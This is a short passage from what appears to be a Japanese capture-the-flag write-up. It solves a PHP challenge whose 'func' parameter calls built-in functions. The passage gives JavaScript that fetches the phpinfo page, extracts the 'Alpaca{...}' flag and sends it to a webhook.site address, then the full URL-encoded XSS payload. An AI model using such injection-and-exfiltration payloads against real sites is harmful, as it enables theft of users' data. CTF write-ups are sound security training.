`php`の組み込み関数が利用できるので、それを使う。

以下のスクリプトを実行させてやればよい。裏で`phpinfo`にアクセスさせ、返されたテキストの中からフラグを取り出し、Webhook.siteに送信する。

```javascript
fetch('/?func=phpinfo')
  .then(response => response.text())
  .then(html => {
    const match = html.match(/Alpaca\{.*?\}/);
    if (match) {
      fetch('https://webhook.site/[webhook.siteのUUID]?flag=' + encodeURIComponent(match[0]));
    }
  });
```

これを`<script>`タグで囲ってからURLエンコードして、`string`パラメータに渡してやると、最終的なペイロードは以下のようになる。

```
?func=echoString&string=%3Cscript%3Efetch%28%27%2F%3Ffunc%3Dphpinfo%27%29.then%28response%3D%3Eresponse.text%28%29%29.then%28html%3D%3E%7Bconst+match%3Dhtml.match%28%2FAlpaca%5C%7B.%2A%3F%5C%7D%2F%29%3Bif%28match%29%7Bfetch%28%27https%3A%2F%2Fwebhook.site%2F[webhook.siteのUUID]%3Fflag%3D%27%2BencodeURIComponent%28match%5B0%5D%29%29%3B%7D%7D%29%3B%3C%2Fscript%3E
```